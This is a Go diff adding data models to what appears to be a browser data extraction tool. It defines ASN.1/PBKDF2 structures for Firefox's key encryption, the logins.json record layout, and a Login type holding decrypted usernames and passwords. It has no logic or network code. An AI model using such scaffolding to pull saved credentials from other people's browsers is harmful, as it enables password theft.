@@ -1,6 +1,9 @@
 package models
 
-import "time"
+import (
+	"encoding/asn1"
+	"time"
+)
 
 type SystemInfo struct {
 	ActivationLockStatus      string `json:"Activation Lock Status"`
@@ -135,6 +138,12 @@ type BrowserConfig struct {
 	Name       string
 	PathString string
 	PrintName  string
+	Type       string
+}
+
+type ExtensionConfig struct {
+	ExtensionID   string
+	ExtensionName string
 }
 
 type HistoryEntry struct {
@@ -166,4 +175,68 @@ type ExtractionResults struct {
 	SystemInfo SystemInfo             `json:"system_info"`
 	Browsers   map[string]BrowserData `json:"browsers"`
 	Timestamp  time.Time              `json:"timestamp"`
+}
+
+type OID = asn1.ObjectIdentifier
+
+type EncryptedData struct {
+	EncryptionAlgo Algo
+	Encrypted      []byte
+}
+
+type Algo struct {
+	AlgoID OID
+	Params PKCS5Params
+}
+
+type PKCS5Params struct {
+	KDF    KDF
+	Cipher CipherParams
+}
+
+type KDF struct {
+	AlgoID OID
+	Params PBKDF2Params
+}
+
+type PBKDF2Params struct {
+	Salt           []byte
+	IterationCount int
+	KeyLength      int `asn1:"optional"`
+	PRF            asn1.RawValue
+}
+
+type CipherParams struct {
+	Algo OID
+	IV   []byte
+}
+
+type GeckoJsonData struct {
+	NextID int              `json:"nextId"`
+	Logins []GeckoJsonLogin `json:"logins"`
+}
+
+type GeckoJsonLogin struct {
+	ID                  int     `json:"id"`
+	Hostname            string  `json:"hostname"`
+	HttpRealm           *string `json:"httpRealm"`
+	FormSubmitURL       *string `json:"formSubmitURL"`
+	UsernameField       string  `json:"usernameField"`
+	PasswordField       string  `json:"passwordField"`
+	EncryptedUsername   string  `json:"encryptedUsername"`
+	EncryptedPassword   string  `json:"encryptedPassword"`
+	GUID                string  `json:"guid"`
+	EncType             int     `json:"encType"`
+	TimeCreated         int64   `json:"timeCreated"`
+	TimeLastUsed        int64   `json:"timeLastUsed"`
+	TimePasswordChanged int64   `json:"timePasswordChanged"`
+	TimesUsed           int     `json:"timesUsed"`
+}
+
+type Login struct {
+	EncryptedUsername string
+	EncryptedPassword string
+	Username          string
+	Password          string
+	URL               string
 }
